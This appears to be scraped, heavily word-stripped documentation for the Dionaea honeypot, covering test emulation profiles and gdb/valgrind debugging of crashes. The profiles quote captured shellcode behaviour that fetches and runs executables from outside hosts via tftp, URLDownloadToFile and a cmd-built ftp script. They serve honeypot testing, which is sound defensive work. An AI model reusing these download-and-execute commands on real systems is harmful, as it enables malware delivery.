dumping dionaea.core import ihandlerclass idumper(ihandler): def __init__(self, pattern): ihandler.__init__(self, pattern) def handle(self, icd): icd.dump() = idumper('*') emu profilesmall collection various shellcode profiles gatherd dionaea. createprocess commands profile trigger download via tftp.p='[{\"call\": \"createprocess\", \"args\": [\"\", \"tftp.exe - 92.17.46.208 ssms.exe\", \"\", \"\", \"1\", \"40\", \"\", \"\", {\"dwxcountchars\": \"0\", \"dwfillattribute\": \"0\", \"hstdinput\": \"0\", \"dwycountchars\": \"0\", \"cbreserved2\": \"0\", \"cb\": \"0\", \"dwx\": \"0\", \"dwy\": \"0\", \"dwxsize\": \"0\", \"lpdesktop\": \"0\", \"hstderror\": \"68\", \"dwflags\": \"0\", \"lpreserved\": \"0\", \"lpreserved2\": \"0\", \"hstdoutput\": \"0\", \"lptitle\": \"0\", \"dwysize\": \"0\", \"wshowwindow\": \"0\"}, {\"dwprocessid\": \"4712\", \"hprocess\": \"4711\", \"dwthreadid\": \"4714\", \"hthread\": \"4712\"}], \"return\": \"-1\"}, {\"call\": \"createprocess\", \"args\": [\"\", \"ssms.exe\", \"\", \"\", \"1\", \"40\", \"\", \"\", {\"dwxcountchars\": \"0\", \"dwfillattribute\": \"0\", \"hstdinput\": \"0\", \"dwycountchars\": \"0\", \"cbreserved2\": \"0\", \"cb\": \"0\", \"dwx\": \"0\", \"dwy\": \"0\", \"dwxsize\": \"0\", \"lpdesktop\": \"0\", \"hstderror\": \"68\", \"dwflags\": \"0\", \"lpreserved\": \"0\", \"lpreserved2\": \"0\", \"hstdoutput\": \"0\", \"lptitle\": \"0\", \"dwysize\": \"0\", \"wshowwindow\": \"0\"}, {\"dwprocessid\": \"4712\", \"hprocess\": \"4711\", \"dwthreadid\": \"4714\", \"hthread\": \"4712\"}], \"return\": \"-1\"}, {\"call\": \"exitthread\", \"args\": [\"0\"], \"return\": \"0\"}]' dionaea.core import incident = incident(\"dionaea.module.emu.profile\").set(\"profile\", str(p)).report() urldownloadtofile profile trigger download.p='[{\"call\": \"loadlibrarya\", \"args\": [\"urlmon\"], \"return\": \"0x7df20000\"}, {\"call\": \"urldownloadtofile\", \"args\": [\"\", \"http://82.165.32.34/compiled.exe\", \"47.scr\", \"0\", \"0\"], \"return\": \"0\"}, {\"call\": \"winexec\", \"args\": [\"47.scr\", \"895\"], \"return\": \"32\"}]' dionaea.core import incident = incident(\"dionaea.module.emu.profile\").set(\"profile\", str(p)).report() winexec commands profile uses winexec create command file windows ftpclient, downloads file, executes file.p='[{\"call\": \"winexec\", \"args\": [\"cmd /c echo open welovewarez.com 21 > &echo user wat l0l1 >> &echo scum.exe >> &echo quit >> &ftp -n -s: &scum.exe\\\\\", \"0\"], \"return\": \"32\"}, {\"call\": \"exitthread\", \"args\": [\"0\"], \"return\": \"0\"}]' dionaea.core import incident = incident(\"dionaea.module.emu.profile\").set(\"profile\", str(p)).report() segfault case experience segfault, will something this: is end. software had segmentation fault. bug encountered may be exploitable. you to assist fixing bug, please send backtrace below nepenthesdev@gmail.com. can create better backtraces gdb, more information visit http://dionaea.carnivore./#segfaultonce read message, tty may broken, simply type reset, it come life again/opt/dionaea/bin/dionaea(sigsegv_backtrace_cb+0x20)[0x805c11e][0x70d420]/opt/dionaea/lib/libemu/libemu..2(emu_env_w32_eip_check+0x94)[0x186974]/opt/dionaea/lib/dionaea/emu.(run+0x39)[0x89cced]/opt/dionaea/lib/dionaea/emu.(profile+0xbb)[0x89db88]/opt/dionaea/lib/dionaea/emu.(proc_emu_on_io_in+0x1e1)[0x89bfc5]/opt/dionaea/bin/dionaea(recurse_io_process+0x31)[0x805df4a]/opt/dionaea/bin/dionaea(processors_io_in_thread+0x85)[0x805e08d]/opt/dionaea/bin/dionaea(threadpool_wrapper+0x2e)[0x805c99a]/opt/dionaea/lib/libglib-2.0..0[0xaa9498]/opt/dionaea/lib/libglib-2.0..0[0xaa7a2f]/lib/libpthread..0[0xd8973b]/lib/libc..6(clone+0x5e)[0x2b3cfe]while backtrace itself gives idea might wrong, does fix problem. fix problem, logfiles usually help, dionaea is very verbose default. below are hints to started debugging, click here <#support> assistance. debugging valgrindvalgrind does great job, here is i it:valgrind -v --leak-check=full --leak-resolution=high --show-reachable=yes \\--log-file=dionaea-debug.log /opt/dionaea/bin/dionaea ---dionaea-options gdb logfile assisted the above example, was able scrape shellcode thelogfile, run in libemu, without involving dionaea all,reducing problem.gdb /opt/dionaea/bin/sctest(gdb) run -s -s 10000000 -g < sc.binstarting program: /media/sda4/opt64/dionaea/bin/sctest -s -s 10000000 -g < sc.binonce crashed, retrieved full backtrace:program received signal sigsegv, segmentation fault.env_w32_hook_getprocaddress (env=0x629a30, hook=<value optimized >) at environment/win32/env_w32_dll_export_kernel32_hooks.c:545545 struct emu_env_hook *hook = (struct emu_env_hook *)ehi->value;(gdb) bt full#0 env_w32_hook_getprocaddress (env=0x629a30, hook=<value optimized >) at environment/win32/env_w32_dll_export_kernel32_hooks.c:545 dll = 0x6366f0 ehi = <value optimized > hook = <value optimized > c = 0x611180 mem = <value optimized > eip_save = <value optimized > module = 2088763392 p_procname = 4289925 procname = <value optimized >#1 0x00007ffff7b884fb emu_env_w32_eip_check (env=0x629a30) environment/win32/emu_env_w32.c:306 dll = <value optimized > ehi = <value optimized > hook = 0x64c5b0 eip = <value optimized >#2 0x0000000000403995 test (e=0x60f0e0) sctestmain.c:277 hook = 0xe2 ev = 0x0 iv = <value optimized > cpu = 0x611180 mem = <value optimized > env = 0x629a30 na = <value optimized > j = 7169 last_vertex = 0x0 graph = 0x0 eh = 0x0 ehi = 0x0 ret = <value optimized > eipsave = 2088807840#3 0x00000000004044e4 main (argc=5, argv=0x7fffffffe388) sctestmain.c:971 e = <value optimized >in case, problem was bug libemu. gdb dump memoryonce again, broke, we got backtrace:#0 0xb70b0b57 emu_queue_enqueue (eq=0xb3da0918, data=0x4724ab) emu_queue.c:63 eqi = (struct emu_queue_item *) 0x0#1 0xb70b15d1 emu_shellcode_run_and_track (e=0xb4109cd0, data=0xb411c698 \"\", datasize=<value optimized >, eipoffset=<value optimized >, steps=256, etas=0xb410cd60, known_positions=0xb3d7a810, stats_tested_positions_list=0xb3da3bf0, brute_force=true) emu_shellcode.c:408 current_pos_ti_diff = (struct emu_tracking_info *) 0x88c3c88 current_pos_ht = <value optimized > current_pos_v = <value optimized > current_pos_satii = (struct emu_source_and_track_instr_info *) 0xb407e7f8 bfs_queue = (struct emu_queue *) 0xb3e17668 ret = 4662443 eipsave = <value optimized > hook = <value optimized > j = 4 es = <value optimized > eli = (struct emu_list_item *) 0xb3e17658 cpu = (struct emu_cpu *) 0xb4109ab0 mem = (struct emu_memory *) 0xb410c3a0 eq = (struct emu_queue *) 0xb3da0918 env = (struct emu_env *) 0xb3e10208 eli = (struct emu_list_item *) 0x4724ab#2 0xb70b1a2a emu_shellcode_test (e=0xb4109cd0, data=0xb411c698 \"\", size=<value optimized >) at emu_shellcode.c:546 es = (struct emu_stats *) 0xb3d92b28 new_results = (struct emu_list_root *) 0xb3da3bf0 offset = <value optimized > el = (struct emu_list_root *) 0xb4100510 etas = (struct emu_track_and_source *) 0xb410cd60 eh = (struct emu_hashtable *) 0xb3d7a810 eli = (struct emu_list_item *) 0xb3d92b40 results = (struct emu_list_root *) 0xb3d82850 es = <value optimized > __pretty_function__ = \"emu_shellcode_test\"#3 0xb712140c proc_emu_on_io_in (con=0x8864b58, pd=0x87dc388) detect.c:145 e = (struct emu *) 0xb4109cd0 ctx = (struct emu_ctx *) 0x87a2400 offset = 14356 streamdata = (void *) 0xb411c698 size = 8196 ret = 0 __pretty_function__ = \"proc_emu_on_io_in\"#4 0x0805e8be recurse_io_process (pd=0x87dc388, con=0x8864b58, dir=bistream_in) processor.c:167 locals.#5 0x0805ea01 processors_io_in_thread (data=0x8864b58, userdata=0x87dc388) processor.c:197 con = (struct connection *) 0x8864b58 pd = (struct processor_data *) 0x87dc388 __pretty_function__ = \"processors_io_in_thread\"#6 0x0805d2da threadpool_wrapper (data=0x87d7bd0, user_data=0x0) threads.c:49 t = (struct thread *) 0x87d7bd0 timer = (gtimer *) 0xb4108540#7 0xb77441f6 g_thread_pool_thread_proxy (data=0x83db460) gthreadpool.c:265 task = (gpointer) 0x87d7bd0 pool = (grealthreadpool *) 0x83db460#8 0xb7742b8f g_thread_create_proxy (data=0x83dc7d0) gthread.c:635 __pretty_function__ = \"g_thread_create_proxy\"#9 0xb76744c0 start_thread () /lib/i686/cmov/libpthread..0 symbol table info available.#10 0xb75f36de clone () /lib/i686/cmov/libc..6 symbol table info available.again, was bug libemu, unbreakable loop consuming memory. reproduce, have dump tested buffer, therefore need buffers address size. luckily size is noted frame #2 8196 and data address is parameter got optimized forframe #2.dump binary memory /tmp/sc.bin 0xb411c698 0xb411e89cafterwards, debugging libemu feeding data sctest is easy.'ve had fun objgraph gdb debugging reference count leaks python too, here <http://carnivore./2009/12/23/arcane_bugs> is writeup. gdb python3 embeddedsometimes, is something wrong the python scripts, gdbdoes provide useful output:bt full#12 0xb765f12d pyeval_evalframeex (f=0x825998c, throwflag=0) python/ceval.c:2267 stack_pointer = (pyobject **) 0x8259af0 next_instr = (unsigned char *) 0x812fabf \"m'\" opcode = 100 oparg = <value optimized > why = 3071731824 err = 1 x = (pyobject *) 0xb7244aac v = <value optimized > w = (pyobject *) 0xadb5e4dc u = (pyobject *) 0xb775ccb0 freevars = (pyobject **) 0x8259af0 retval = (pyobject *) 0x0 tstate = (pythreadstate *) 0x809aab0 co = (pycodeobject *) 0xb717b800 instr_ub = -1 instr_lb = 0 instr_prev = -1 first_instr = (unsigned char *) 0x812f918 \"t\" names = (pyobject *) 0xb723f50c consts = (pyobject *) 0xb71c9f7c opcode_targets = {0xb765d202, 0xb765f60a, 0xb766133a, 0xb76612db, 0xb7661285, 0xb7661222, 0xb765d202, 0xb765d202, 0xb765d202, 0xb76611dd, 0xb766114b, 0xb76610b9, 0xb766100f, 0xb765d202, 0xb765d202, 0xb7660f7d, 0xb765d202, 0xb765d202, 0xb765d202, 0xb7660eb7, 0xb7660dfb, 0xb765d202, 0xb7660d30, 0xb7660c65, 0xb7660ba9, 0xb7660aed, 0xb7660a31, 0xb7660975, 0xb76608b9, 0xb76607fd, 0xb765d202 <repeats 24 times>, 0xb7660736, 0xb766066b, 0xb76605af, 0xb76604f3, 0xb765d202, 0xb7660437, 0xb766035d, 0xb76602ad, 0xb7661aba, 0xb76619fe, 0xb7661942, 0xb7661886, 0xb7661b76, 0xb76614a8, 0xb7661413, 0xb766138e, 0xb766171f, 0xb76616e6, 0xb765d202, 0xb765d202, 0xb765d202, 0xb766162a, 0xb766156e, 0xb76601f1, 0xb7660135, 0xb76617ca, 0xb7660120, 0xb765fff7, 0xb765d202, 0xb765fd72, 0xb765fc6e, 0xb765d202, 0xb765fc1d, 0xb765fe17, 0xb765fd90, 0xb765fec0, 0xb765fb41, 0xb765fadc, 0xb765f9ed, 0xb765f94d, 0xb765f8be, 0xb765f7e3, 0xb765f779, 0xb765f6bd, 0xb765f66c, 0xb765ef1d, 0xb765eea2, 0xb765ede1, 0xb765ed1a, 0xb765ec35, 0xb765ebc3, 0xb765eb30, 0xb765ea69, 0xb765f1c7, 0xb765f027, 0xb765f560, 0xb765efc1, 0xb76630e3, 0xb766310c, 0xb765e64c, 0xb765e592, 0xb765f49a, 0xb765f3de, 0xb765d202, 0xb765d202, 0xb765f39e, 0xb7663135, 0xb766315f, 0xb765e9cb, 0xb765d202, 0xb765e948, 0xb765e8bb, 0xb765e817, 0xb765d202, 0xb765d202, 0xb765d202, 0xb765d2ae, 0xb765e3e0, 0xb7663275, 0xb765e1a2, 0xb766324e, 0xb765e0ba, 0xb765e01e, 0xb765df74, 0xb765d202, 0xb765d202, 0xb7663189, 0xb76631d3, 0xb7663220, 0xb765e149, 0xb765d202, 0xb765de09, 0xb765dec0, 0xb765f2c0, 0xb765d202 <repeats 108 times>}#13 0xb7664ac0 pyeval_evalcodeex (co=0xb717b800, globals=0xb7160b54, locals=0x0, args=0x84babb8, argcount=9, kws=0x0, kwcount=0, defs=0xb719e978, defcount=1, kwdefs=0x0, closure=0x0) python/ceval.c:3198 f = (pyframeobject *) 0x825998c retval = <value optimized > freevars = (pyobject **) 0x8259af0 tstate = (pythreadstate *) 0x809aab0 x = <value optimized > u = <value optimized >luckily python3 ships some gdb macros, assist dealing this mess. can grab over here<http://svn.python.org/view/python/tags/r311/misc/gdbinit?view=markup>,place to ~/.gdbinit, where ~ is homedirectory the userdionaea runs .if get /*warning: using untrusted file \"/home/user/.gdbinit\"*/ are running gdb via sudo, the file /home/user/.gdbinit has beowned root. you are running root, you /*program received signalsigttou, stopped (tty output).*/, run stty -nostop before running gdb,reattach process fg, close gdb properly, start .once got macros loaded properly gdb startup, set breakpoint pyeval_evalframeex dionaea loaded everything:break pyeval_evalframeex we some useful macros gdb:pyframevpyframev combines output pyframe pylocals. aware can segfault dionaea from within gdb, going , out the python call stack calling of macros and mostcases segfault dionaea, therefore backtrace make sure are still within valid frames. can't pystack pystackv they rely py_main, is invalid assumption embedded python. cui honorem, honoremsurfnet surfnet always supported .working surfnet is real pleasure. support you are getting frustrated, things not for and already read faq <#faq>, join ml share experience, the chat. * mailing list <https://lists.sourceforge.net/lists/listinfo/nepenthes-devel> * chat (freenode, #nepenthes) <irc://irc.freenode.org/nepenthes> links * gsoc project #10 <http://honeynet.org/gsoc/project10> * gsoc timeline <http://socghop.appspot.com/document/show/program/google/gsoc2009/timeline> * honeynet project <http://honeynet.org/>"
}